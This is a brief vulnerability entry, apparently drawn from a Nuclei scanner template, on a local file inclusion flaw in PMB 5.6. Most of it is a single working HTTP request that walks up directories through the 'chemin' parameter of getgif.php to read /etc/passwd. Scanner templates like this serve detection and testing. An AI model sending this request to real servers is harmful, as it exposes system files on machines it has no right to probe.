# Vulnerability: PMB 5.6 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`pmb-local-file-disclosure.yaml`)

## Description
PMB 5.6 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif={{rand_base(4)}}
```

